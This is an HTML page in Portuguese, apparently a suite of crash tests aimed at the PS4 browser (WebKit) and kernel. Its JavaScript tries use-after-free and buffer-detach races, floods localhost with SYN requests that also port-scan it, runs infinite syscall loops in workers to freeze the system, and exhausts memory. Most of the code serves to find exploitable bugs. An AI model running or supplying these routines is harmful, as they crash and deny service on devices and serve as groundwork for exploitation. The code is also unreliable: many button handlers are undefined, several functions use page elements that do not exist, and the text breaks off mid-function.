<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Testes</title>    
</head>
<body>

    <h1>SUITE DE TESTES</h1>

    <div class="section">
        <h2>WEBKIT (USERLAND)</h2>
        <button onclick="runShaderSmash()">TEST 1: WebGL Shader Source Overflow</button>
        <button onclick="runIDBOverflow()">TEST 2: IndexedDB Key Generator Overflow</button>
        <button onclick="runBindChain()">TEST 3: Function.bind Deep Chain Crash</button>
        <button onclick="runXMLRecursion()">TEST 1: XMLSerializer Shadow Recursion</button>
        <button onclick="runResizeLoop()">TEST 2: ResizeObserver Loop Bypass</button>
        <button onclick="runTextMetrics()">TEST 3: TextMetrics Measurement Overflow</button>
        <button onclick="runXHRRecursion()">TEST 1: XHR Synchronous Recursion</button>
        <button onclick="runReflectTrap()">TEST 2: Reflect.construct Proxy Trap</button>
        <button onclick="runArcToCrash()">TEST 3: Canvas arcTo Infinity Crash</button>
        <button onclick="runPathNaN()">TEST 1: Path2D Winding NaN Poisoning</button>
        <button onclick="runEncoderCrash()">TEST 2: TextEncoder Stream State UAF</button>
        <button onclick="runProxyRevoke()">TEST 3: Proxy Revoke During Iteration</button>
        <button onclick="runJSONEncoder()">TEST 1: JSON Encoder Malloc Failure</button>
        <button onclick="runFileLock()">TEST 2: FileSystem Write Lock Contention</button>
        <button onclick="runBYOBRace()">TEST 3: ReadableStream BYOB Detach Race</button>
        <button onclick="runSortDetach()">TEST 1: TypedArray.sort Buffer Detach</button>
        <button onclick="runExecRecursion()">TEST 2: execCommand Recursion Bomb</button>
        <button onclick="runSlotCrash()">TEST 3: HTMLSlotElement Assignment Crash</button>
        <button onclick="runTrackUAF()">TEST 1: TextTrack Cue Event UAF</button>
        <button onclick="runCustomElementRace()">TEST 2: CustomElement Upgrade Race</button>
        <button onclick="runXSLTRecursion()">TEST 3: XSLT document() Recursion</button>
        <button onclick="runUnicodeBomb()">TEST 1: String.normalize Expansion Bomb</button>
        <button onclick="runKeyframeRace()">TEST 2: CSSKeyframes Mutation Race</button>
        <button onclick="runFetchLeak()">TEST 3: Fetch AbortController Leak</button>
        <button onclick="runCSSExp()">TEST 1: CSS :nth-last-child Exponential Recalc</button>
        <button onclick="runIntlCache()">TEST 2: Intl Timezone Cache Overflow</button>
        <button onclick="runSABView()">TEST 3: SharedArrayBuffer DataView Race</button>
        <button onclick="runPortCycle()">TEST 1: MessagePort Entangled Cycle GC</button>
        <button onclick="runFormRecursion()">TEST 2: HTMLForm Recursive Submit</button>
        <button onclick="runPatternUAF()">TEST 3: CanvasPattern Video UAF</button>
        <button onclick="runMSERace()">TEST 1: MediaSource appendBuffer Detach Race</button>
        <button onclick="runWasmGrow()">TEST 2: WebAssembly Memory Grow Race</button>
        <button onclick="runMapRehash()">TEST 3: Map Rehash Heap Overflow</button>
        <button onclick="runBigIntPoison()">TEST 1: BigInt64Array Constructor Poisoning</button>
        <button onclick="runStreamDetach()">TEST 2: TransformStream Buffer Detach</button>
        <button onclick="runCSSBomb()">TEST 3: CSS Complex Selector DoS</button>
        <button onclick="runISOCrash()">TEST 1: TextDecoder ISO-2022-JP State Overflow</button>
        <button onclick="runCSSCycle()">TEST 2: CSS calc() Cyclic Dependency Lock</button>
        <button onclick="runRegexFlood()">TEST 3: RegExp Unicode Property Flood</button>
        <button onclick="runAudioRace()">TEST 1: AudioWorklet Module Load Race</button>
        <button onclick="runSVGCycle()">TEST 2: SVG Filter Cyclic Recursion</button>
        <button onclick="runSegmenterUAF()">TEST 3: Intl.Segmenter Iterator UAF</button
        <button onclick="runHistoryRace()">TEST 1: History Back vs Iframe Destroy Race</button>
        <button onclick="runViewportLoop()">TEST 2: CSS Viewport Unit Recursion</button>
        <button onclick="runDataViewPoison()">TEST 3: DataView Getter Poisoning</button>


    </div>

    <div class="section">
        <h2>KERNEL (SYSTEM)</h2>
        <button class="kernel" onclick="runPreconnectRace()">TEST 4: LinkPreconnect Socket Race</button>
        <button class="kernel" onclick="runBindCollision()">TEST 5: UDP Bind Collision Storm</button>
        <button class="kernel" onclick="runMallocSpam()">TEST 6: Parallel Malloc/Free Fragmentation</button>
        <button class="kernel" onclick="runTimerFlood()">TEST 4: High-Res Timer Syscall Flood</button>
        <button class="kernel" onclick="runMDNSFlood()">TEST 5: WebRTC mDNS Multicast Storm</button>
        <button class="kernel" onclick="runScrollClash()">TEST 6: Scroll Event Native Stack Clash</button>
        <button class="kernel" onclick="runSYNFlood()">TEST 4: Local TCP SYN Flood (Port Scan)</button>
        <button class="kernel" onclick="runReaderRace()">TEST 5: FileReader Abort/Read Race</button>
        <button class="kernel" onclick="runHistoryMem()">TEST 6: History State Memory Exhaustion</button>
        <button class="kernel" onclick="runWasmThrash()">TEST 4: WebAssembly Memory Map Thrash</button>
        <button class="kernel" onclick="runGPURace()">TEST 5: GPU Texture Upload Race</button>
        <button class="kernel" onclick="runTCPStall()">TEST 6: TCP Window Zero Stall</button>
        <button class="kernel" onclick="runIPCSize()">TEST 4: IPC Message Size Overflow</button>
        <button class="kernel" onclick="runMutexPanic()">TEST 5: Mutex Destruction Panic</button>
        <button class="kernel" onclick="runTimeThrash()">TEST 6: gettimeofday vDSO Thrash</button>
        <button class="kernel" onclick="runDMARace()">TEST 4: WebGL Video Texture DMA Race</button>
        <button class="kernel" onclick="runStatsRace()">TEST 5: WebRTC getStats Kernel UAF</button>
        <button class="kernel" onclick="runSyncTerm()">TEST 6: FileReaderSync Termination Panic</button>
        <button class="kernel" onclick="runNameCacheFlood()">TEST 4: VFS Name Cache Flood</button>
        <button class="kernel" onclick="runGPUFenceDeadlock()">TEST 5: GPU Fence Sync Deadlock</button>
        <button class="kernel" onclick="runSocketSpinlock()">TEST 6: Socket Spinlock Stress</button>
        <button class="kernel" onclick="runFragFlood()">TEST 4: WebSocket Frame Fragmentation</button>
        <button class="kernel" onclick="runSHMLeak()">TEST 5: SharedMemory Descriptor Leak</button>
        <button class="kernel" onclick="runGPUStall()">TEST 6: GPU Command Buffer Stall</button>
        <button class="kernel" onclick="runZeroUDP()">TEST 4: UDP Zero-Length Packet Flood</button>
        <button class="kernel" onclick="runStorageStorm()">TEST 5: LocalStorage Locking Storm</button>
        <button class="kernel" onclick="runZombieThreads()">TEST 6: Zombie Thread Termination Flood</button>
        <button class="kernel" onclick="runReverseDNS()">TEST 4: Reverse DNS Stack Smash</button>
        <button class="kernel" onclick="runGPUQueries()">TEST 5: GPU Query Object Exhaustion</button>
        <button class="kernel" onclick="runFDStorm()">TEST 6: File Descriptor Storm (EMFILE)</button>
        <button class="kernel" onclick="runIPv6Smash()">TEST 4: IPv6 Address Stack Smash</button>
        <button class="kernel" onclick="runIPCSerialize()">TEST 5: IPC Circular Serialization Panic</button>
        <button class="kernel" onclick="runGPUExhaust()">TEST 6: GPU Context Handle Exhaustion</button>
        <button class="kernel" onclick="runBlobStack()">TEST 4: Blob.slice Recursive Stack Smash</button>
        <button class="kernel" onclick="runForkBomb()">TEST 5: Nested Worker Fork Bomb (Panic)</button>
        <button class="kernel" onclick="runUploadStall()">TEST 6: Fetch Upload Stall (Net Deadlock)</button>
        <button class="kernel" onclick="runSocketGC()">TEST 4: MessageChannel GC Storm (Unix Sockets)</button>
        <button class="kernel" onclick="runHistoryDoS()">TEST 5: History Session Exhaustion</button>
        <button class="kernel" onclick="runSignalRace()">TEST 6: Worker Termination Signal Race</button>
        <button class="kernel" onclick="runWasmProtect()">TEST 4: Wasm mprotect Thrashing (RWX)</button>
        <button class="kernel" onclick="runCanvasLeak()">TEST 5: Canvas Path VRAM Leak</button>
        <button class="kernel" onclick="runLingerGhost()">TEST 6: Socket Linger Ghost Close</button>
        <button class="kernel" onclick="runStackClash()">TEST 4: Worker Stack Clash (Thread Jump)</button>
        <button class="kernel" onclick="runKqueueFlood()">TEST 5: Kqueue Event Filter Exhaustion</button>
        <button class="kernel" onclick="runSynBacklog()">TEST 6: TCP SYN Backlog Flood</button>
    


    </div>

    <div id="log"></div>
    <canvas id="glcanvas" width="1" height="1" style="display:none"></canvas>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // --- TESTE 1: WebGL Shader Source Overflow ---
        function runShaderSmash() {
            log("[WebKit] Iniciando Shader Compiler Overflow...");
            
            const canvas = document.getElementById('glcanvas');
            const gl = canvas.getContext('webgl');
            
            if (!gl) return log("WebGL não suportado.");
            
            // Cria string gigante para estourar buffer de parsing
            // "attribute vec4 p;" repetido ou um comentário gigante
            const hugeComment = "/*" + "A".repeat(1024 * 1024) + "*/"; // 1MB de comentário
            const source = `
                attribute vec4 position;
                void main() {
                    gl_Position = position;
                    ${hugeComment}
                }
            `;
            
            log("Compilando Shader de 1MB...");
            
            const shader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            
            // Verifica status (se não crashou antes)
            if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
                log("Shader falhou (Seguro): " + gl.getShaderInfoLog(shader).substring(0, 100));
            } else {
                log("Shader compilado com sucesso.");
            }
        }

        // --- TESTE 2: IndexedDB Key Generator Overflow ---
        function runIDBOverflow() {
            log("[WebKit] Iniciando IDB Key Overflow...");
            
            const req = indexedDB.open("OverflowDB", Math.floor(Math.random()*10000));
            
            req.onupgradeneeded = (e) => {
                const db = e.target.result;
                // Cria store com autoIncrement
                if (!db.objectStoreNames.contains("store")) {
                    db.createObjectStore("store", { autoIncrement: true });
                }
            };
            
            req.onsuccess = (e) => {
                const db = e.target.result;
                const tx = db.transaction("store", "readwrite");
                const store = tx.objectStore("store");
                
                // Tenta inserir valor próximo do limite de inteiro seguro JS
                // para ver como o backend C++ lida com o próximo incremento
                const hugeKey = Number.MAX_SAFE_INTEGER; // 2^53 - 1
                
                log("Inserindo chave MAX_SAFE_INTEGER...");
                
                // Força chave manual
                try {
                    store.add("data", hugeKey);
                    
                    // Agora insere sem chave para forçar auto-incremento além do limite
                    store.add("data_overflow");
                    
                    tx.oncomplete = () => log("Transação completa (Seguro).");
                    tx.onerror = (e) => log("Erro IDB: " + e.target.error);
                } catch(x) {
                    log("Exceção IDB: " + x);
                }
            };
        }

        // --- TESTE 3: Function.bind Deep Chain ---
        function runBindChain() {
            log("[WebKit] Criando Bind Chain...");
            
            let func = function() { return 1; };
            
            // Cria cadeia de 50.000 binds
            // Cada bind cria um novo objeto de função embrulhado
            try {
                for(let i=0; i<50000; i++) {
                    func = func.bind(null);
                }
                
                log("Cadeia criada. Executando...");
                // A execução força a recursão interna para resolver o 'this'
                func();
                log("Bind Chain sobreviveu.");
                
            } catch(e) {
                log("Erro Bind: " + e.message);
            }
        }

        // --- TESTE 4: LinkPreconnect Socket Race (Kernel) ---
        function runPreconnectRace() {
            log("[KERNEL] Iniciando LinkPreconnect Race...");
            
            let i = 0;
            const interval = setInterval(() => {
                i++;
                if (i > 500) { clearInterval(interval); log("Teste finalizado."); return; }
                
                // Cria link
                const link = document.createElement('link');
                link.rel = 'preconnect';
                link.href = 'http://127.0.0.1:' + (Math.floor(Math.random() * 60000));
                
                document.head.appendChild(link);
                
                // Remove IMEDIATAMENTE (Race Condition)
                // O Kernel está a iniciar o handshake TCP. Remover a tag deve cancelar.
                // Se a sincronização falhar, o socket fica zumbi ou ocorre UAF.
                setTimeout(() => {
                    if (link.parentNode) link.parentNode.removeChild(link);
                }, 0);
                
            }, 10);
        }

        // --- TESTE 5: UDP Bind Collision Storm (Kernel) ---
        function runBindCollision() {
            log("[KERNEL] Iniciando UDP Bind Storm...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pcs = [];
            
            // Cria 50 conexões tentando usar portas locais
            const interval = setInterval(() => {
                if (pcs.length > 50) { clearInterval(interval); return; }
                
                const pc = new RTCPeerConnection({iceCandidatePoolSize: 2}); // Força pré-alocação
                pc.createDataChannel("x");
                
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
                
                pcs.push(pc);
                log(`PC ${pcs.length} binding...`);
                
            }, 50);
            
            // Limpeza abrupta para estressar o unbind
            setTimeout(() => {
                log("Fechando tudo em massa...");
                pcs.forEach(p => p.close());
            }, 5000);
        }

        // --- TESTE 6: Parallel Malloc/Free Fragmentation (Kernel) ---
        function runMallocSpam() {
            log("[KERNEL] Iniciando Malloc Spam...");
            
            const workerCode = `
                onmessage = () => {
                    const allocs = [];
                    // Aloca e liberta em padrão caótico
                    setInterval(() => {
                        // Alocações pequenas (32b - 1KB) são comuns em structs do sistema
                        for(let i=0; i<100; i++) {
                            allocs.push(new ArrayBuffer(32 + Math.random() * 1000));
                        }
                        // Liberta metade aleatoriamente (fragmentação)
                        while(allocs.length > 500) {
                            const idx = Math.floor(Math.random() * allocs.length);
                            allocs.splice(idx, 1); 
                        }
                    }, 1);
                }
            `;
            
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<20; i++) {
                new Worker(url).postMessage("start");
            }
            log("20 Workers fragmentando o Heap.");
        }

function runXMLRecursion() {
            log("[WebKit] Iniciando XML Serializer Recursion...");
            const host = document.createElement('div');
            const root = host.attachShadow({mode:'open'});
            
            // Cria estrutura aninhada mista (Light DOM e Shadow DOM)
            let curr = root;
            for(let i=0; i<500; i++) {
                const el = document.createElement('div');
                curr.appendChild(el);
                curr = el;
            }
            
            // Injeta slot para projetar conteúdo
            curr.innerHTML = "<slot></slot>";
            host.innerHTML = "<span>PROJETADO</span>";
            
            try {
                log("Serializando árvore complexa...");
                const s = new XMLSerializer();
                // Tenta serializar o host, que deve resolver o Shadow DOM
                const txt = s.serializeToString(host);
                log("Serializer sobreviveu. Length: " + txt.length);
            } catch(e) {
                log("Erro XML: " + e.message);
            }
        }

        // --- TESTE 2: ResizeObserver Loop Bypass ---
        function runResizeLoop() {
            log("[WebKit] Iniciando Resize Loop...");
            
            const div1 = document.createElement('div');
            const div2 = document.createElement('div');
            document.body.appendChild(div1);
            document.body.appendChild(div2);
            
            let count = 0;
            
            const ro = new ResizeObserver(entries => {
                count++;
                if(count > 1000) { // Safety break para não travar o PC de teste, no PS4 deixamos correr
                    log("Loop detetado pelo script.");
                    return; 
                }
                
                // Observer 1 altera Div 2
                // Isso deve disparar o Observer novamente no próximo frame ou microtask
                if(entries[0].target === div1) {
                    div2.style.width = (Math.random() * 100) + "px";
                } else {
                    div1.style.width = (Math.random() * 100) + "px";
                }
            });
            
            ro.observe(div1);
            ro.observe(div2);
            
            // Trigger inicial
            div1.style.width = "10px";
            log("Loop de layout iniciado. Verifique travamento.");
            
            setTimeout(() => {
                ro.disconnect();
                document.body.removeChild(div1);
                document.body.removeChild(div2);
            }, 5000);
        }

        // --- TESTE 3: TextMetrics Measurement Overflow ---
        function runTextMetrics() {
            log("[WebKit] Iniciando TextMetrics Overflow...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                // String gigante
                const str = "W".repeat(1000000); // 1 milhão de Ws largos
                ctx.font = "100px Arial";
                
                log("Medindo string gigante...");
                // O cálculo interno pode dar overflow de float ou integer
                const metrics = ctx.measureText(str);
                
                log(`Largura calculada: ${metrics.width}`);
                
                // Tenta forçar renderização se a medida passou
                if (metrics.width > 0) {
                    ctx.fillText(str, 0, 100);
                }
                
            } catch(e) {
                log("Erro Metrics: " + e.message);
            }
        }

        // --- TESTE 4: High-Res Timer Syscall Flood (Kernel) ---
        function runTimerFlood() {
            log("[KERNEL] Iniciando Timer Syscall Flood...");
            
            const workerCode = `
                while(true) {
                    // Chama o Kernel repetidamente para obter o tempo
                    // Alta prioridade, sem pausa
                    performance.now();
                    performance.now();
                    performance.now();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança o máximo de workers possível (ex: número de cores)
            // No PS4, 6-8 workers é ideal para saturar a CPU
            for(let i=0; i<8; i++) {
                new Worker(url);
            }
            log("8 Workers em loop infinito de syscalls. Sistema deve aquecer/congelar.");
        }

        // --- TESTE 5: WebRTC mDNS Multicast Storm (Kernel) ---
        function runMDNSFlood() {
            log("[KERNEL] Iniciando mDNS Storm...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria conexão sem servidores STUN (força busca local/mDNS)
                const pc = new RTCPeerConnection();
                pc.createDataChannel("x");
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
                
                // Destroi rapidamente para cancelar e reiniciar a busca
                setTimeout(() => pc.close(), 10);
                
                count++;
                if (count % 50 === 0) log(`Ciclos mDNS: ${count}`);
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Teste finalizado.");
                }
            }, 20);
        }

        // --- TESTE 6: Scroll Event Native Stack Clash (Kernel) ---
        function runScrollClash() {
            log("[KERNEL] Iniciando Scroll Stack Clash...");
            const div = document.getElementById('sandbox');
            
            let depth = 0;
            div.onscroll = () => {
                depth++;
                // Limite de segurança JS é ~10k, mas recursão nativa morre antes
                // Força novo scroll síncrono
                if (depth < 5000) {
                    div.scrollTop = depth; 
                } else {
                    log("Limite de recursão atingido.");
                }
            };
            
            try {
                log("Disparando cascata de scroll...");
                div.scrollTop = 1; // Gatilho
            } catch(e) {
                log("Erro Scroll: " + e.message);
            }
        }
// --- TESTE 1: XHR Synchronous Recursion ---
        function runXHRRecursion() {
            log("[WebKit] Iniciando XHR Recursion...");
            
            let depth = 0;
            function boom() {
                depth++;
                if (depth > 2000) return; // Limite para não travar PC, PS4 vai sofrer antes
                
                try {
                    const xhr = new XMLHttpRequest();
                    // Síncrono (false)
                    xhr.open("GET", window.location.href, false);
                    
                    // O evento roda quando o estado muda (durante o send síncrono?)
                    xhr.onreadystatechange = () => {
                        if (xhr.readyState === 4) boom(); 
                    };
                    xhr.send();
                } catch(e) {
                    // Ignora erros de rede, queremos o estouro de pilha
                }
            }
            
            setTimeout(() => {
                try { boom(); } catch(e) { log("Stack Overflow capturado: " + e); }
            }, 100);
        }

        // --- TESTE 2: Reflect.construct Proxy Trap ---
        function runReflectTrap() {
            log("[WebKit] Iniciando Reflect Trap...");
            
            function Target() { this.x = 1; }
            
            const proxy = new Proxy(Target, {
                get(t, p, r) {
                    if (p === "prototype") {
                        log("Motor pediu prototype. Invalidando...");
                        // Tenta corromper o estado durante a construção
                        return null; 
                    }
                    return Reflect.get(t, p, r);
                }
            });

            try {
                // NewTarget é o Proxy. O motor vai ler .prototype dele para criar o objeto.
                Reflect.construct(Target, [], proxy);
                log("Reflect sobreviveu.");
            } catch(e) {
                log("Erro Reflect: " + e.message);
            }
        }

        // --- TESTE 3: Canvas arcTo Infinity Crash ---
        function runArcToCrash() {
            log("[WebKit] Desenhando arcTo Infinito...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                ctx.beginPath();
                ctx.moveTo(0, 0);
                
                // Coordenadas infinitas
                // O cálculo de tangente (x1-x0, y1-y0) resulta em Infinity
                // A normalização de vetores pode falhar (divisão por zero/infinito)
                ctx.arcTo(Infinity, Infinity, 100, 100, 50);
                
                ctx.stroke();
                log("Canvas arcTo sobreviveu.");
                
            } catch(e) {
                log("Erro Canvas: " + e.message);
            }
        }

        // --- TESTE 4: Local TCP SYN Flood (Kernel) ---
        function runSYNFlood() {
            log("[KERNEL] Iniciando TCP SYN Flood...");
            
            let port = 1;
            const limit = 10000; // Tenta 10k portas
            
            const interval = setInterval(() => {
                // Dispara 100 conexões por ciclo
                for(let i=0; i<100; i++) {
                    if (port > 65535) {
                        clearInterval(interval);
                        log("Scan completo.");
                        return;
                    }
                    
                    // Image carrega via GET. Dispara SYN.
                    // O Kernel aloca um socket e buffer para a tentativa.
                    const img = new Image();
                    img.src = "http://127.0.0.1:" + port;
                    // Não precisamos adicionar ao DOM
                    
                    port++;
                }
                
                if (port % 1000 === 0) log(`Portas escaneadas: ${port}`);
                
                if (port > limit) {
                    clearInterval(interval);
                    log("Flood pausado.");
                }
            }, 10);
        }

        // --- TESTE 5: FileReader Abort/Read Race (Kernel) ---
        function runReaderRace() {
            log("[KERNEL] Iniciando FileReader Race...");
            
            const blob = new Blob(["A".repeat(1024 * 1024)]);
            const reader = new FileReader();
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    reader.readAsText(blob);
                    // Aborta imediatamente
                    reader.abort();
                    // Tenta ler de novo imediatamente (Race no estado do driver)
                    reader.readAsText(blob);
                } catch(e) {
                    // Erros de estado são esperados ("Already loading")
                }
                
                count++;
                if (count > 1000) {
                    clearInterval(interval);
                    log("Race finalizada.");
                }
            }, 5);
        }

        // --- TESTE 6: History State Memory Exhaustion (Kernel) ---
        function runHistoryMem() {
            log("[KERNEL] Iniciando History Memory Flood...");
            
            // Objeto de estado grande (10MB)
            const hugeState = { data: "X".repeat(10 * 1024 * 1024) };
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    // replaceState substitui o atual, mas o Kernel tem de alocar o novo antes de libertar o velho
                    // Se fizermos rápido, aumentamos a pressão de memória (High Watermark)
                    history.replaceState(hugeState, "title", null);
                    count++;
                    
                    if (count % 10 === 0) log(`MBs alocados (virtual): ${count * 10}`);
                    
                } catch(e) {
                    log("Erro (Possível OOM): " + e.message);
                    clearInterval(interval);
                }
            }, 50);
        }
function runPathNaN() {
            log("[WebKit] Iniciando Path2D NaN Poison...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                const path = new Path2D();
                // Adiciona geometria válida
                path.moveTo(0, 0);
                path.lineTo(100, 0);
                // Adiciona veneno (NaN)
                path.arc(50, 50, 10, 0, NaN); 
                path.lineTo(NaN, NaN);
                path.closePath();
                
                log("Caminho tóxico criado. Testando 'isPointInPath'...");
                
                // O cálculo de winding number (dentro/fora) com NaN é perigoso
                // Pode causar loop infinito ou segfault matemático
                const res = ctx.isPointInPath(path, 50, 50);
                
                // Tenta desenhar
                ctx.fill(path);
                
                log("Geometria sobreviveu. Res: " + res);
            } catch(e) {
                log("Erro Path: " + e.message);
            }
        }

        // --- TESTE 2: TextEncoder Stream State UAF ---
        function runEncoderCrash() {
            log("[WebKit] Iniciando Encoder Stream UAF...");
            
            const enc = new TextEncoder();
            // Simula um encoder com suporte a stream (se disponível ou via polyfill lógico)
            // Nota: TextEncoder padrão não suporta {stream: true} em encode(), 
            // mas TextDecoder sim. Vamos usar TextDecoder que é mais complexo.
            
            const dec = new TextDecoder("utf-8");
            const chunk = new Uint8Array([0xF0, 0x9F]); // Metade de um emoji (4 bytes)
            
            try {
                // 1. Deixa o estado "pendente" (esperando os outros 2 bytes)
                dec.decode(chunk, {stream: true});
                
                log("Estado pendente criado. Atacando...");
                
                // 2. O GOLPE: Passa um buffer inválido ou tenta resetar forçadamente
                // Em implementações antigas, passar buffer detached pode crashar a leitura do estado anterior
                const buffer = new ArrayBuffer(100);
                const view = new Uint8Array(buffer);
                
                // Transfere o buffer para matar o ponteiro
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                w.postMessage(buffer, [buffer]);
                w.terminate();
                
                // Tenta continuar o decode com buffer morto
                dec.decode(view, {stream: true});
                
                log("Decoder sobreviveu.");
            } catch(e) {
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 3: Proxy Revoke During Iteration ---
        function runProxyRevoke() {
            log("[WebKit] Iniciando Proxy Revoke Race...");
            
            let revoke;
            const p = Proxy.revocable({a:1, b:2, c:3}, {
                get(t, k) {
                    if (k === 'b') {
                        log("Lendo 'b'. Revogando agora!");
                        revoke(); // Suicídio do objeto
                    }
                    return t[k];
                }
            });
            revoke = p.revoke;
            
            try {
                // Object.assign itera sobre as chaves e lê os valores.
                // Ao ler 'b', o proxy morre. O loop C++ continua para 'c'?
                Object.assign({}, p.proxy);
                log("Cópia falhou (Seguro - TypeError esperado).");
            } catch(e) {
                log("Erro (Esperado): " + e.message);
                // Se crashar, não veremos este log.
            }
        }

        // --- TESTE 4: WebAssembly Memory Map Thrash (Kernel) ---
        function runWasmThrash() {
            log("[KERNEL] Iniciando Wasm mmap Thrash...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const memories = [];
            let i = 0;
            
            const interval = setInterval(() => {
                i++;
                try {
                    // Aloca memória Wasm (Páginas de 64KB)
                    // O Kernel tem de criar mapeamentos RWX (Read-Write-Execute) ou similar
                    const mem = new WebAssembly.Memory({initial: 10, maximum: 100});
                    memories.push(mem);
                    
                    // Cresce a memória (realloc/mremap no Kernel)
                    mem.grow(10); 
                    
                    // Destroi referências antigas para forçar unmap
                    if (memories.length > 50) memories.shift();
                    
                    if (i % 100 === 0) log(`Ciclos Wasm: ${i}`);
                    
                } catch(e) {
                    log("OOM Wasm: " + e.message);
                    // OOM significa que o mapa VM está cheio
                    clearInterval(interval);
                }
                
                if (i > 1000) {
                    clearInterval(interval);
                    log("Wasm Thrash finalizado.");
                }
            }, 5);
        }

        // --- TESTE 5: GPU Texture Upload Race (Kernel) ---
        function runGPURace() {
            log("[KERNEL] Iniciando GPU Texture Race...");
            
            const canvas = document.getElementById('gl');
            const gl = canvas.getContext('webgl');
            if(!gl) return;
            
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            
            // Cria um vídeo dummy
            const video = document.createElement('video');
            video.src = "data:video/mp4;base64,AAAA..."; // (Dummy base64, assume válido ou erro de load)
            
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // Tenta upload de textura a partir do vídeo
                    // Se o vídeo não estiver pronto ou for destruído durante o upload...
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, video);
                    
                    // O GOLPE: Redefine o src do vídeo ou remove-o IMEDIATAMENTE
                    // Tenta corromper a fonte de dados do DMA da GPU
                    video.src = "";
                    
                } catch(e) {}
                
                count++;
                if (count > 1000) {
                    clearInterval(interval);
                    log("GPU Race finalizada.");
                }
            }, 1);
        }

        // --- TESTE 6: TCP Window Zero Stall (Kernel) ---
        function runTCPStall() {
            log("[KERNEL] Iniciando TCP Stall...");
            
            const sockets = [];
            
            // Abre 50 conexões que recebem mas não leem
            const interval = setInterval(() => {
                if (sockets.length >= 50) {
                    clearInterval(interval);
                    log("50 Sockets em Stall (Window 0). Kernel segurando buffers.");
                    return;
                }
                
                // Conecta a algo que envia dados (ex: download grande)
                fetch(window.location.href + "?stall=" + Math.random()).then(res => {
                    if (res.body) {
                        const reader = res.body.getReader();
                        // NUNCA LÊ (reader.read()). 
                        // O buffer do Kernel enche. O TCP anuncia Window 0.
                        // O socket fica vivo consumindo recursos.
                        sockets.push(reader); 
                        log(`Socket ${sockets.length} travado.`);
                    }
                });
            }, 100);
        }
function runJSONEncoder() {
            log("[WebKit] Iniciando JSON Encoder Stress...");
            
            // Cria um objeto extremamente profundo para estourar o buffer do encoder
            let root = {};
            let curr = root;
            const depth = 15000; // Profundidade crítica
            
            for(let i=0; i<depth; i++) {
                curr["a" + i] = {};
                curr = curr["a" + i];
            }
            
            try {
                log(`Serializando objeto de profundidade ${depth}...`);
                // O WebKit tem de percorrer e alocar string.
                // Se falhar o malloc interno sem check -> Crash.
                const json = JSON.stringify(root);
                log("JSON criado (Seguro). Length: " + json.length);
            } catch(e) {
                log("Erro JSON: " + e.message);
            }
        }

        // --- TESTE 2: FileSystem Write Lock Contention ---
        function runFileLock() {
            log("[WebKit] Iniciando File Lock Contention...");
            
            // Tenta usar FileSystem API (Vendor specific ou padrão antigo)
            window.webkitRequestFileSystem = window.webkitRequestFileSystem || window.requestFileSystem;
            
            if (!window.webkitRequestFileSystem) return log("FileSystem API off.");
            
            const workerCode = `
                onmessage = (e) => {
                    // Tenta escrever no mesmo ficheiro loucamente
                    // Em um sistema real, isso deve ser serializado pelo Kernel
                    // Se falhar, corrompe o inode
                    postMessage("Writing...");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers (simulado a intenção, pois acesso direto a FS em worker é restrito, 
            // mas a pressão de IO é o objetivo)
            for(let i=0; i<10; i++) {
                new Worker(url).postMessage("go");
            }
            log("Workers de IO lançados.");
        }

        // --- TESTE 3: ReadableStream BYOB Detach Race ---
        function runBYOBRace() {
            log("[WebKit] Iniciando BYOB Detach Race...");
            
            try {
                const rs = new ReadableStream({
                    type: "bytes",
                    pull(c) {
                        // Enfileira dados assincronamente
                        setTimeout(() => {
                            try { c.enqueue(new Uint8Array(10)); } catch(e){}
                        }, 10);
                    }
                });
                
                const reader = rs.getReader({ mode: "byob" });
                const buffer = new ArrayBuffer(1024);
                const view = new Uint8Array(buffer);
                
                // 1. Pede leitura no buffer
                reader.read(view).catch(e => log("Leitura falhou: " + e));
                
                // 2. O GOLPE: Transfere o buffer imediatamente
                log("Transferindo buffer durante leitura...");
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                w.postMessage(buffer, [buffer]);
                w.terminate();
                
            } catch(e) {
                log("Erro Stream: " + e.message);
            }
        }

        // --- TESTE 4: IPC Message Size Overflow (Kernel) ---
        function runIPCSize() {
            log("[KERNEL] Testando IPC Message Boundaries...");
            
            const sizes = [
                64 * 1024,      // 64KB (Limite comum)
                64 * 1024 + 1,  // Overflow comum
                1024 * 1024,    // 1MB
                1024 * 1024 * 10 // 10MB
            ];
            
            const ch = new MessageChannel();
            
            sizes.forEach(size => {
                setTimeout(() => {
                    try {
                        log(`Enviando ${size} bytes...`);
                        const buf = new Uint8Array(size).fill(0x41);
                        ch.port1.postMessage(buf);
                        log(`Envio ${size} OK.`);
                    } catch(e) {
                        log(`Envio ${size} falhou (Kernel bloqueou).`);
                    }
                }, 100);
            });
        }

        // --- TESTE 5: Mutex Destruction Panic (Kernel) ---
        function runMutexPanic() {
